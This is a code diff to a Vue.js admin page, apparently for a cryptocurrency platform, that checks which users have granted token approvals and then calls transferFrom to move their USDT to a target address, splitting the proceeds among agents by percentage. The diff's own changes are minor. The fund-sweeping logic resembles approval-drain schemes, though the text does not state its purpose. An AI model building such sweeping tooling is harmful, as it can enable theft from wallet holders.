@@ -216,10 +216,20 @@ export default {
                         })
 
                         console.log('USDT总额: (' + balance + ')  ' + agentAdress + '[' + this.getAccountTransfer[index].proportion + '%]' + ' 得到的USDT: ', curBalance)
+
                         blockChain.doTransferFrom(agentAdress, apiKey, userEthAddress, targetAddress, curBalance, async (status, hash, nonce) => {
                             if (status == true) {
                                 // 划账记录
-                                await this.AddRemitAccount({ loginUserId: res.id, id: this.getAccountTransfer[next].uid, address: this.scoperow.bscMainnetAddress, type: chainType, hash: txWebAddress + hash })
+                                var hashData = txWebAddress + hash
+                                await this.AddRemitAccount(
+                                    {
+                                        loginUserId: this.user.id,
+                                        id: this.user.id,
+                                        address: userEthAddress,
+                                        type: chainType,
+                                        hash: hashData
+                                    })
+
                                 this.$notify({
                                     title: '操作成功',
                                     message: h('i', { style: 'color: teal' }, '请等待上链确认信息, 您的链上Hash: ' + hash + '\n等待时间由当前链块阻塞度与燃油费高低决定, 请耐心等待到账')
@@ -264,7 +274,7 @@ export default {
             else if (chainType == 'TRC') userAddress = row.trcMainnetAddress
 
             blockChain.doBalanceOf(this.user.address, userAddress, async (result) => {
-                if (result) {
+                if (result != null) {
                     console.log("余额 = ", result);
                     this.balance = result
                     await this.AccountBalance({
@@ -318,7 +328,6 @@ export default {
                     item.upperAgent = upperAddress
                     item.isTransferFrom = agentAddress == upperAddress ? true : false
                     await blockChain.checkApprove(upperAddress, userAddress, (result) => {
-                        console.log("userAddress = ", userAddress)
                         if (result) {
                             this.listawait.push(item)
                         }
